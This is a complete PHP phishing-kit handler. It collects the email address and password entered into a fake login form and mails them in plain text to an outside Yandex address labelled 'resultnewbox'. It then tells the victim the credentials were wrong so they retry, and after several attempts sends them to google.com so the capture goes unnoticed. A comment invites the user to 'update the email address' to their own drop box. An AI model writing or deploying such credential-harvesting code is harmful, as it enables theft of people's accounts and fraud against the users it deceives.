<?php
 session_start();

  if(isset($_SESSION['count'])){

  }else{
     $_SESSION['count'] = 1;
  }


  if(isset($_POST['submit'])){

    $useremail = $_POST['uemail'];
    $userpassword = $_POST['password'];
    // echo $useremail;

if(!empty($useremail)||!empty($userpassword) ){
     $_SESSION['count'] = $_SESSION['count']+ 1;
if ($_SESSION['count']>=3) {
    $_SESSION['count'] = 1;
    header("location:https://www.google.com/");
    exit;
  }
  else
  {
    header("refresh:0.1 url=index.html?message=Wrong Credentials");

  }

}

    if(empty($useremail)||empty($userpassword))
{
    echo "Email and Password are mandatory!";
    exit;
}

$email_from = 'resultnewbox@yandex.com';//<== update the email address
$email_subject = "New Entry";
$email_body = "You have received a new message from the user $useremail.\n".
    "Here is the password: $userpassword. \n".

$to = "resultnewbox@yandex.com";//<== update the email address
$headers = "From: $email_from \r\n";
$headers .= "Reply-To: $useremail \r\n";
//Send the email
mail($to,$email_subject,$email_body,$headers);
//done. redirect to thank-you page.




// Function to validate against any email injection attempts
function IsInjected($str)
{
  $injections = array('(\n+)',
              '(\r+)',
              '(\t+)',
              '(%0A+)',
              '(%0D+)',
              '(%08+)',
              '(%09+)'
              );
  $inject = join('|', $injections);
  $inject = "/$inject/i";
  if(preg_match($inject,$str))
    {
    return true;
  }
  else
    {
    return false;
  }
}









}

?>
